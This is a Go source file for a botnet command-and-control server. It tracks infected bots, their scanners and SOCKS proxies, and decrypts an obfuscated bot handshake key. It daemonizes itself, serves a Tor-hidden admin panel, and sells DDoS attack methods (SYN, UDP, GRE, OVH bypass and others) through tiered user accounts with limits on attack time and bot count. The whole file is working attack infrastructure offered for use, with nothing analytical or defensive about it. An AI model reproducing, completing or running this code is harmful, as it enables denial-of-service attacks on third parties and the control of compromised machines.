package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/crypto/chacha20poly1305"
)

// usersFile is resolved at init to support running from project root or cnc dir
var usersFile string

func init() {
	// Chdir to binary's directory so all relative paths (db/, tor/, etc.)
	// work regardless of where the binary is launched from.
	if exe, err := os.Executable(); err == nil {
		dir := filepath.Dir(exe)
		os.Chdir(dir)
	}
	os.MkdirAll("db", 0700)
	// Migrate old users.json into db/ if it exists
	if _, err := os.Stat("users.json"); err == nil {
		if _, err2 := os.Stat("db/users.json"); err2 != nil {
			os.Rename("users.json", "db/users.json")
		}
	}
	usersFile = "db/users.json"

	// Decode MAGIC_CODE from encrypted blob
	MAGIC_CODE = decodeMagicCode()
}

// decodeMagicCode reconstructs the key from XOR-split halves and decrypts
// the ChaCha20-Poly1305 AEAD blob.
func decodeMagicCode() string {
	if _mcBlob == "" {
		log.Fatal("MAGIC_CODE blob is empty — run setup.py first")
	}
	blob, err := hex.DecodeString(_mcBlob)
	if err != nil {
		log.Fatalf("MAGIC_CODE hex decode: %v", err)
	}
	// Reconstruct key: key[i] = _mcKey0[i] ^ _mcKey1[i]
	var key [32]byte
	for i := 0; i < 32; i++ {
		key[i] = _mcKey0[i] ^ _mcKey1[i]
	}
	aead, err := chacha20poly1305.New(key[:])
	if err != nil {
		log.Fatalf("MAGIC_CODE cipher init: %v", err)
	}
	nonceSize := aead.NonceSize() // 12
	if len(blob) < nonceSize {
		log.Fatal("MAGIC_CODE blob too short")
	}
	nonce := blob[:nonceSize]
	ct := blob[nonceSize:]
	pt, err := aead.Open(nil, nonce, ct, nil)
	if err != nil {
		log.Fatalf("MAGIC_CODE decrypt: %v", err)
	}
	// Zero the key
	for i := range key {
		key[i] = 0
	}
	return string(pt)
}

const (
	USER_SERVER_IP = "0.0.0.0"
	BOT_SERVER_IP  = "0.0.0.0"

	//run setup.py dont try to change this yourself

	BOT_SERVER_PORTS = "443" // comma-separated, set by setup.py
	USER_SERVER_PORT = "420"

	PROTOCOL_VERSION = "r1.1-stable"

	DEFAULT_PROXY_USER = "vision" // set by setup.py
	DEFAULT_PROXY_PASS = "vision" // set by setup.py
)

// MAGIC_CODE — encrypted at compile time, decoded at init.
// _mcBlob is a hex-encoded ChaCha20-Poly1305 ciphertext (nonce‖ct‖tag).
// _mcKey0 / _mcKey1 are XOR-split halves of the 32-byte decryption key.
// All three are patched by setup.py.
var (
	_mcBlob = "17fd58b9f6dc52decb18015f26a7f4d20bc79ab3dcf2c590239343c95d8ad4d194925e74f74a3ea987ba82bd" // set by setup.py — hex(nonce‖aead_ct)
	_mcKey0 = [32]byte{0x9b, 0x1e, 0xe3, 0x58, 0x3a, 0xd3, 0x4b, 0x65, 0xb9, 0x2e, 0xf8, 0x0d, 0xc9, 0xfd, 0x9e, 0x53, 0x1b, 0x48, 0x30, 0x83, 0x11, 0x19, 0x4c, 0x2e, 0xfd, 0xd2, 0xb2, 0x73, 0x16, 0x2d, 0xf2, 0x85}
	_mcKey1 = [32]byte{0x1c, 0x06, 0x61, 0xc2, 0xa2, 0x5a, 0x5d, 0x9d, 0x28, 0x55, 0xf1, 0x76, 0x76, 0xd9, 0x9f, 0xbd, 0x4b, 0x01, 0x97, 0xe9, 0x5d, 0x1a, 0xf7, 0x85, 0x8f, 0xe2, 0x5f, 0x17, 0x64, 0x2b, 0x09, 0xab}
	MAGIC_CODE string
)

type BotConnection struct {
	conn          *CipherConn
	botID         string
	connectedAt   time.Time
	lastPing      time.Time
	authenticated bool
	arch          string
	ip            string
	ram           int64
	cpuCores      int
	processName   string
	country       string
	origin        string // how this bot was recruited: "direct", "b0at.telnet", etc.
	group         string
	userConn      net.Conn
	socksActive   bool
	socksRelay    string
	socksStarted  time.Time
	socksUser     string
	hasScanner    bool
	hasAttack     bool
	lastCommand        string
	lastCmdTime        time.Time
	scanningType       string // "ssh", "http", or "" if idle
	scanBatchSize      int    // total targets in current batch
	scanBatchRemaining int    // targets not yet reported
	totalHits          int    // lifetime hit count for this bot
}

type client struct {
	conn           net.Conn
	user           User
	lastBotCommand time.Time
}

type Credential struct {
	Username string `json:"Username"`
	Password string `json:"Password"`
	Expire   string `json:"Expire"`
	Level    string `json:"Level"`
}

var (
	botConnections = make(map[string]*BotConnection)
	botConnsLock   sync.RWMutex
	botCount       int
	commandOrigin      = make(map[string]net.Conn)
	originLock         sync.RWMutex
	previewCollectors     = make(map[string]chan string)
	previewCollectorsLock sync.Mutex
	clientsLock    sync.RWMutex
	tuiMode        bool
	c2StartTime    time.Time
)

func logMsg(format string, args ...interface{}) {
	if !tuiMode {
		fmt.Printf(format+"\n", args...)
	}
}

var (
	clients = []*client{}
)

const daemonEnv = "_DOCKER_DAEMON"

// daemonize re-execs the current binary as a fully detached background process.
// The parent prints the child PID and exits. The child continues execution.
// Returns true in the child (caller should continue), false if daemonization
// was not requested. The parent never returns — it calls os.Exit.
func daemonize() bool {
	// Already the daemon child — do housekeeping and continue
	if os.Getenv(daemonEnv) == "1" {
		os.Unsetenv(daemonEnv)
		// Redirect stdin/stdout/stderr to /dev/null
		devNull, err := os.OpenFile("/dev/null", os.O_RDWR, 0)
		if err == nil {
			syscall.Dup2(int(devNull.Fd()), int(os.Stdin.Fd()))
			syscall.Dup2(int(devNull.Fd()), int(os.Stdout.Fd()))
			syscall.Dup2(int(devNull.Fd()), int(os.Stderr.Fd()))
			devNull.Close()
		}
		// Ignore terminal signals
		signal.Ignore(syscall.SIGHUP, syscall.SIGINT, syscall.SIGQUIT,
			syscall.SIGTSTP, syscall.SIGTTIN, syscall.SIGTTOU)
		return true
	}

	// Parent: re-exec self with daemon env marker
	exe, err := os.Executable()
	if err != nil {
		fmt.Println("[ERROR] Cannot resolve executable path for daemonize:", err)
		os.Exit(1)
	}

	cmd := exec.Command(exe, os.Args[1:]...)
	cmd.Env = append(os.Environ(), daemonEnv+"=1")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true, // new session, fully detached from terminal
	}
	// No stdin/stdout/stderr — child will redirect to /dev/null itself
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		fmt.Println("[ERROR] Failed to daemonize:", err)
		os.Exit(1)
	}

	fmt.Printf("[☾℣☽] Daemon started (PID %d)\n", cmd.Process.Pid)
	cmd.Process.Release()
	os.Exit(0)
	return false // unreachable
}

func main() {
	c2StartTime = time.Now()

	if _, fileError := os.ReadFile(usersFile); fileError != nil {
		allMethods := []string{
			"udp", "vse", "dns", "udpplain", "std",
			"syn", "ack", "stomp", "xmas", "usyn", "tcpall", "tcpfrag", "ovh", "asyn",
			"greip", "greeth",
		}
		basicMethods := []string{"udpplain", "syn", "ack"}
		proMethods := []string{"udp", "udpplain", "std", "syn", "ack", "stomp", "xmas"}

		password, err := randomString(12)
		if err != nil {
			fmt.Println("Error generating password:", err)
			return
		}

		users := []User{
			{Username: "root", Password: password, Expire: time.Now().AddDate(111, 0, 0), Level: "Owner", Methods: allMethods, MaxTime: 3600, Concurrents: 10, MaxBots: 0},
			{Username: "admin", Password: "admin123", Expire: time.Now().AddDate(1, 0, 0), Level: "Admin", Methods: allMethods, MaxTime: 1200, Concurrents: 5, MaxBots: 0},
			{Username: "user1", Password: "user1pass", Expire: time.Now().AddDate(0, 1, 0), Level: "Pro", Methods: proMethods, MaxTime: 600, Concurrents: 3, MaxBots: 500},
			{Username: "user2", Password: "user2pass", Expire: time.Now().AddDate(0, 1, 0), Level: "Basic", Methods: basicMethods, MaxTime: 300, Concurrents: 1, MaxBots: 100},
		}

		bytes, err := json.MarshalIndent(users, "", "  ")
		if err != nil {
			fmt.Println("Error marshalling user data:", err)
			return
		}
		if err := os.WriteFile(usersFile, bytes, 0600); err != nil {
			fmt.Println("Error writing to users.json:", err)
			return
		}
		fmt.Println("[☾℣☽] Created users.json with 4 example users:")
		fmt.Printf("  root   / %s  (Owner  - all methods, 3600s, 10 slots, unlimited bots)\n", password)
		fmt.Println("  admin  / admin123  (Admin  - all methods, 1200s, 5 slots, unlimited bots)")
		fmt.Println("  user1  / user1pass (Pro    - 7 methods, 600s, 3 slots, 500 bots)")
		fmt.Println("  user2  / user2pass (Basic  - 3 methods, 300s, 1 slot, 100 bots)")
	}

	daemon := false
	flagTUI := false
	flagWeb := false
	flagSplit := false
	for _, arg := range os.Args[1:] {
		switch arg {
		case "--daemon":
			daemon = true
		case "--web":
			flagWeb = true
		case "--tui":
			flagTUI = true
		case "--split":
			flagSplit = true
		}
	}

	// Daemonize: fork into background with new session, detached from terminal
	if daemon {
		daemonize() // parent prints PID and exits; child continues here
	}

	var runTUI, runWebTor, runSplit bool
	if daemon || flagTUI || flagWeb || flagSplit {
		runTUI = flagTUI
		runWebTor = flagWeb || daemon
		runSplit = flagSplit
	} else {
		choices := RunLauncher()
		runTUI = choices.TUI
		runWebTor = choices.WebTor
		runSplit = choices.Split
	}

	if !runTUI && !runWebTor && !runSplit {
		runTUI = true
	}

	tuiMode = runTUI && !runSplit && !runWebTor

	go cleanupDeadBots()

	// Start bot server on all configured ports (raw TCP with EZF3 detection)
	botPorts := strings.Split(BOT_SERVER_PORTS, ",")
	for _, bp := range botPorts {
		bp = strings.TrimSpace(bp)
		if bp == "" {
			continue
		}
		go func(port string) {
			logMsg("[☾℣☽] Bot server starting on %s:%s (EZF3)", BOT_SERVER_IP, port)
			botListener, err := net.Listen("tcp", BOT_SERVER_IP+":"+port)
			if err != nil {
				fmt.Printf("[FATAL] Error starting bot server on port %s: %v\n", port, err)
				os.Exit(1)
			}
			defer botListener.Close()

			logMsg("[☾℣☽] Bot server is running on port %s (EZF3)", port)

			for {
				conn, err := botListener.Accept()
				if err != nil {
					logMsg("Error accepting bot connection: %v", err)
					continue
				}
				go func(c net.Conn) {
					enc, err := HandleEZF3Handshake(c, MAGIC_CODE)
					if err != nil {
						c.Close()
						return
					}
					handleBotConnection(enc)
				}(conn)
			}
		}(bp)
	}

	StartStatsRecorder()

	if runWebTor {
		go func() {
			handler := NewWebMux()
			go cleanupExpiredSessions()
			if err := StartTorWebServer(handler); err != nil {
				fmt.Println("[ERROR] Tor web server failed:", err)
				fmt.Println("[TOR] Make sure 'tor' is installed: apt install tor")
			}
		}()
	}

	if runSplit {
		go func() {
			fmt.Printf("[☾℣☽] Admin CLI server starting on %s:%s\n", USER_SERVER_IP, USER_SERVER_PORT)
			userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
			if err != nil {
				fmt.Println("[ERROR] Error starting user server:", err)
				return
			}
			defer userListener.Close()

			go updateTitle()

			for {
				conn, err := userListener.Accept()
				if err != nil {
					logMsg("Error accepting user connection: %v", err)
					continue
				}
				logMsg("[☾℣☽] [User] Connected To Login Port: %s", conn.RemoteAddr())
				go handleRequest(conn)
			}
		}()
	}

	if runTUI {
		time.Sleep(500 * time.Millisecond)
		if err := StartTUI(); err != nil {
			fmt.Println("Error running TUI:", err)
			os.Exit(1)
		}
		return
	}

	select {}
}
